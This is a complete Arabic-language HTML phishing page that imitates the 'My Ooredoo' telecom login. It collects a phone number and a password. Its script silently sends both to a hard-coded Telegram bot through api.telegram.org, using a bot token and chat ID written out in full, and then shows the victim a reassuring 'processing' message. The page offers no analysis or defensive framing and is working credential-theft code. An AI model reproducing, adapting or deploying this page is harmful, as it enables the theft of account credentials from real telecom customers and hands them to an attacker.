<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>my Ooredoo</title>

<style>
body {
    font-family: Arial, sans-serif;
    background-color: #fff5f5;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    background-color: white;
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 3px 12px rgba(0, 0, 0, 0.15);
    width: 350px;
    text-align: center;
    border-top: 6px solid #e60000;
}

h1 {
    color: #e60000;
    margin-bottom: 20px;
}

.form-group {
    margin-bottom: 15px;
    text-align: right;
}

label {
    display: block;
    margin-bottom: 5px;
    font-weight: bold;
    color: #444;
}

input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 6px;
    box-sizing: border-box;
}

input:focus {
    border-color: #e60000;
    outline: none;
}

button {
    background-color: #e60000;
    color: white;
    border: none;
    padding: 12px 20px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 16px;
    width: 100%;
    transition: background-color 0.3s;
}

button:hover {
    background-color: #c40000;
}

.message {
    margin-top: 15px;
    padding: 10px;
    border-radius: 6px;
    display: none;
}

.success {
    background-color: #ffe5e5;
    color: #b30000;
}

.error {
    background-color: #ffd6d6;
    color: #800000;
}
</style>
</head>

<body>

<div class="container">
<h1>My Ooredoo</h1>

<form id="registrationForm">

<div class="form-group">
<label for="identifier">رقم الهاتف</label>
<input type="text" id="identifier" required>
</div>

<div class="form-group">
<label for="password">القيمة</label>
<input type="password" id="password" required>
</div>

<button type="submit">أبعث</button>

</form>

<div id="message" class="message"></div>

</div>

<script>
document.getElementById('registrationForm').addEventListener('submit', function(e) {
e.preventDefault();

const identifier = document.getElementById('identifier').value;
const password = document.getElementById('password').value;
const messageDiv = document.getElementById('message');

sendToTelegramBot(identifier, password)
.then(response => {

messageDiv.textContent = "جاري تنفيذ طلبك!";
messageDiv.className = "message success";
messageDiv.style.display = "block";

document.getElementById('registrationForm').reset();

})
.catch(error => {

messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات.";
messageDiv.className = "message error";
messageDiv.style.display = "block";

});
});

async function sendToTelegramBot(identifier, password) {

const botToken = '8360767989:AAHLEvQh4vMJzv-WgD4nWoQgZyXtqr2F_6Q';
const chatId = '6674857009';

const message = `بيانات جديدة:\nرقم الهاتف: ${identifier}\nالقيمة: ${password}`;

const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

const response = await fetch(url,{
method:'POST',
headers:{
'Content-Type':'application/json'
},
body:JSON.stringify({
chat_id:chatId,
text:message
})
});

return await response.json();
}
</script>

</body>
</html>
